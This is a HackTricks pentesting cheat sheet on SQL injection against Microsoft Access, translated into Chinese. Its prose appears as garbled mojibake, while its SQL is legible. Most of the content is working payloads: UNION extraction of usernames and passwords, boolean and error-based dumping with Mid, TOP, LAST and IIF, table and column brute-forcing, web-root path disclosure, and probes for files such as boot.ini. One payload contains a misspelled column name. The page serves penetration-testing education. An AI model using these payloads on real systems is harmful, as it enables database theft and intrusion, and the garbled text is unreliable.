# MS Access SQLæ³¨å…¥

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åœ¨çº¿æ¸¸ä¹åœº

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## æ•°æ®åº“é™åˆ¶

### å­—ç¬¦ä¸²æ‹¼æ¥

å¯ä»¥ä½¿ç”¨`& (%26)`å’Œ`+ (%2b)`å­—ç¬¦è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ã€‚
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### æ³¨é‡Š

åœ¨MS Accessä¸­æ²¡æœ‰æ³¨é‡Šï¼Œä½†æ˜¾ç„¶å¯ä»¥ä½¿ç”¨NULLå­—ç¬¦åˆ é™¤æŸ¥è¯¢çš„æœ€åä¸€ä¸ªå­—ç¬¦ï¼š
```sql
1' union select 1,2 from table%00
```
å¦‚æœè¿™ä¸ªæ–¹æ³•ä¸èµ·ä½œç”¨ï¼Œä½ å¯ä»¥å°è¯•ä¿®å¤æŸ¥è¯¢è¯­å¥çš„è¯­æ³•ï¼š
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### å †å æŸ¥è¯¢

ä¸æ”¯æŒå †å æŸ¥è¯¢ã€‚

### LIMIT

**`LIMIT`** æ“ä½œç¬¦ **æœªå®ç°**ã€‚ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ `TOP` æ“ä½œç¬¦å°† SELECT æŸ¥è¯¢ç»“æœé™åˆ¶ä¸ºå‰ N è¡Œã€‚`TOP` æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºè¦è¿”å›çš„è¡Œæ•°ã€‚
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
å°±åƒTOPä¸€æ ·ï¼Œä½ å¯ä»¥ä½¿ç”¨**`LAST`**æ¥è·å–**ä»æœ«å°¾å¼€å§‹çš„è¡Œ**ã€‚

## UNIONæŸ¥è¯¢/å­æŸ¥è¯¢

åœ¨SQLæ³¨å…¥ä¸­ï¼Œé€šå¸¸éœ€è¦æ‰§è¡Œæ–°çš„æŸ¥è¯¢æ¥ä»å…¶ä»–è¡¨ä¸­æå–ä¿¡æ¯ã€‚MS Accesså§‹ç»ˆè¦æ±‚åœ¨**å­æŸ¥è¯¢æˆ–é¢å¤–æŸ¥è¯¢ä¸­æŒ‡å®š`FROM`**ã€‚\
å› æ­¤ï¼Œå¦‚æœä½ æƒ³æ‰§è¡Œ`UNION SELECT`ã€`UNION ALL SELECT`æˆ–åœ¨æ¡ä»¶ä¸­ä½¿ç”¨æ‹¬å·çš„`SELECT`ï¼Œä½ æ€»æ˜¯**éœ€è¦æŒ‡å®šä¸€ä¸ªå¸¦æœ‰æœ‰æ•ˆè¡¨åçš„`FROM`**ã€‚\
å› æ­¤ï¼Œä½ éœ€è¦çŸ¥é“ä¸€ä¸ª**æœ‰æ•ˆçš„è¡¨å**ã€‚
```sql
-1' UNION SELECT username,password from users%00
```
### é“¾æ¥ç­‰å· + å­å­—ç¬¦ä¸²

{% hint style="warning" %}
è¿™å°†å…è®¸æ‚¨åœ¨ä¸éœ€è¦çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹æå–å½“å‰è¡¨çš„å€¼ã€‚
{% endhint %}

**MS Access** å…è®¸ä½¿ç”¨å¥‡æ€ªçš„è¯­æ³•ï¼Œä¾‹å¦‚ **`'1'=2='3'='asd'=false`**ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒSQLæ³¨å…¥å°†ä½äº **`WHERE`** å­å¥ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚

å‡è®¾æ‚¨åœ¨ MS Access æ•°æ®åº“ä¸­æœ‰ä¸€ä¸ª SQLiï¼Œå¹¶ä¸”æ‚¨çŸ¥é“ï¼ˆæˆ–çŒœæµ‹ï¼‰ä¸€ä¸ª**åˆ—åä¸º username**ï¼Œè¿™æ˜¯æ‚¨æƒ³è¦**æå–**çš„å­—æ®µã€‚æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨ **`Mid`** å‡½æ•°æ¥è·å–å­å­—ç¬¦ä¸²ï¼Œæ£€æŸ¥ Web åº”ç”¨ç¨‹åºåœ¨ä½¿ç”¨é“¾æ¥ç­‰å·æŠ€æœ¯æ—¶çš„ä¸åŒå“åº”ï¼Œå¹¶å¯èƒ½é€šè¿‡**å¸ƒå°”æ³¨å…¥**æ¥æå–å†…å®¹ã€‚
```sql
'=(Mid(username,1,3)='adm')='
```
å¦‚æœä½ çŸ¥é“è¦è½¬å‚¨çš„**è¡¨å**å’Œ**åˆ—å**ï¼Œä½ å¯ä»¥ä½¿ç”¨`Mid`ã€`LAST`å’Œ`TOP`çš„ç»„åˆæ¥é€šè¿‡å¸ƒå°”å‹SQLæ³¨å…¥**æ³„éœ²æ‰€æœ‰ä¿¡æ¯**ï¼š
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_è¯·éšæ„åœ¨åœ¨çº¿æ¸¸ä¹åœºä¸­æ£€æŸ¥æ­¤å†…å®¹ã€‚_

### æš´åŠ›ç ´è§£è¡¨å

ä½¿ç”¨é“¾å¼ç­‰å·æŠ€æœ¯ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼**æš´åŠ›ç ´è§£è¡¨å**ï¼š
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ›´ä¼ ç»Ÿçš„æ–¹æ³•ï¼š
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_è¯·éšæ„åœ¨åœ¨çº¿æ¸¸ä¹åœºä¸­æ£€æŸ¥æ­¤å†…å®¹ã€‚_

* Sqlmapå¸¸è§è¡¨åï¼š[https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* è¿˜æœ‰å¦ä¸€ä¸ªåˆ—è¡¨åœ¨[http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### æš´åŠ›ç ´è§£åˆ—å

æ‚¨å¯ä»¥ä½¿ç”¨ç­‰äºé“¾æ¥æŠ€å·§æ¥**æš´åŠ›ç ´è§£å½“å‰åˆ—å**ï¼š
```sql
'=column_name='
```
æˆ–è€…ä½¿ç”¨ **group by**ï¼š
```sql
-1' GROUP BY column_name%00
```
æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å¯¹**ä¸åŒè¡¨**çš„åˆ—åè¿›è¡Œæš´åŠ›ç ´è§£ï¼š
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### å¯¼å‡ºæ•°æ®

æˆ‘ä»¬å·²ç»è®¨è®ºäº†[**é“¾æ¥ç­‰äºæŠ€æœ¯**](ms-access-sql-injection.md#chaining-equals-+-substring) **æ¥ä»å½“å‰è¡¨å’Œå…¶ä»–è¡¨ä¸­å¯¼å‡ºæ•°æ®**ã€‚ä½†è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼š
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
ç®€è€Œè¨€ä¹‹ï¼Œè¯¥æŸ¥è¯¢ä½¿ç”¨â€œif-thenâ€è¯­å¥æ¥è§¦å‘æˆåŠŸæ—¶çš„â€œ200 OKâ€æˆ–å¦åˆ™è§¦å‘â€œ500 Internal Errorâ€ã€‚åˆ©ç”¨TOP 10è¿ç®—ç¬¦ï¼Œå¯ä»¥é€‰æ‹©å‰åä¸ªç»“æœã€‚éšåä½¿ç”¨LASTåªè€ƒè™‘ç¬¬åä¸ªå…ƒç»„ã€‚åœ¨è¯¥å€¼ä¸Šï¼Œä½¿ç”¨MIDè¿ç®—ç¬¦å¯ä»¥è¿›è¡Œç®€å•çš„å­—ç¬¦æ¯”è¾ƒã€‚é€šè¿‡é€‚å½“æ›´æ”¹MIDå’ŒTOPçš„ç´¢å¼•ï¼Œæˆ‘ä»¬å¯ä»¥è·å–æ‰€æœ‰è¡Œçš„â€œusernameâ€å­—æ®µçš„å†…å®¹ã€‚

### åŸºäºæ—¶é—´çš„æ³¨å…¥

å‚è€ƒ[https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### å…¶ä»–æœ‰è¶£çš„å‡½æ•°

* `Mid('admin',1,1)` ä»ä½ç½®1å¼€å§‹è·å–é•¿åº¦ä¸º1çš„å­å­—ç¬¦ä¸²ï¼ˆåˆå§‹ä½ç½®ä¸º1ï¼‰
* `LEN('1234')` è·å–å­—ç¬¦ä¸²çš„é•¿åº¦
* `ASC('A')` è·å–å­—ç¬¦çš„ASCIIå€¼
* `CHR(65)` æ ¹æ®ASCIIå€¼è·å–å­—ç¬¦ä¸²
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` è®¡ç®—é¡¹ç›®æ•°é‡

## æšä¸¾è¡¨

ä»[**è¿™é‡Œ**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database)å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè·å–è¡¨åçš„æŸ¥è¯¢ï¼š
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œé€šå¸¸ä¼šå‘ç°**æ— æ³•è®¿é—®è¯»å–è¡¨`MSysObjects`**çš„SQLæ³¨å…¥ã€‚

## æ–‡ä»¶ç³»ç»Ÿè®¿é—®

### Webæ ¹ç›®å½•å®Œæ•´è·¯å¾„

äº†è§£**Webæ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„å¯èƒ½æœ‰åŠ©äºè¿›ä¸€æ­¥çš„æ”»å‡»**ã€‚å¦‚æœåº”ç”¨ç¨‹åºé”™è¯¯æ²¡æœ‰å®Œå…¨éšè—ï¼Œå¯ä»¥å°è¯•ä»ä¸å­˜åœ¨çš„æ•°æ®åº“ä¸­é€‰æ‹©æ•°æ®æ¥æ­ç¤ºç›®å½•è·¯å¾„ã€‚

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Accessä¼šè¿”å›ä¸€ä¸ª**åŒ…å«Webç›®å½•å®Œæ•´è·¯å¾„åçš„é”™è¯¯æ¶ˆæ¯**ã€‚

### æ–‡ä»¶æšä¸¾

ä»¥ä¸‹æ”»å‡»å‘é‡å¯ç”¨äº**æ¨æ–­è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿä¸Šæ–‡ä»¶çš„å­˜åœ¨**ã€‚å¦‚æœæŒ‡å®šçš„æ–‡ä»¶å­˜åœ¨ï¼ŒMS Accessä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œé€šçŸ¥æ•°æ®åº“æ ¼å¼æ— æ•ˆï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

å¦ä¸€ç§æšä¸¾æ–‡ä»¶çš„æ–¹æ³•æ˜¯**æŒ‡å®šä¸€ä¸ªæ•°æ®åº“.è¡¨é¡¹**ã€‚**å¦‚æœ**æŒ‡å®šçš„**æ–‡ä»¶å­˜åœ¨**ï¼ŒMS Accessä¼šæ˜¾ç¤ºä¸€ä¸ª**æ•°æ®åº“æ ¼å¼é”™è¯¯æ¶ˆæ¯**ã€‚

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdbæ–‡ä»¶åçŒœæµ‹

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢æ¨æ–­**æ•°æ®åº“æ–‡ä»¶åï¼ˆ.mdbï¼‰**ï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

å…¶ä¸­**name\[i]æ˜¯.mdbæ–‡ä»¶å**ï¼Œ**realTableæ˜¯æ•°æ®åº“ä¸­çš„ä¸€ä¸ªå­˜åœ¨çš„è¡¨**ã€‚è™½ç„¶MS Accessæ€»æ˜¯ä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œä½†å¯ä»¥åŒºåˆ†æ— æ•ˆçš„æ–‡ä»¶åå’Œæœ‰æ•ˆçš„.mdbæ–‡ä»¶åã€‚

### .mdbå¯†ç ç ´è§£

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html)æ˜¯ä¸€ä¸ªå…è´¹å·¥å…·ï¼Œå¯ç”¨äºæ¢å¤Microsoft Access 95/97/2000/XPæˆ–Jet Database Engine 3.0/4.0çš„ä¸»æ•°æ®åº“å¯†ç ã€‚

## å‚è€ƒèµ„æ–™

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
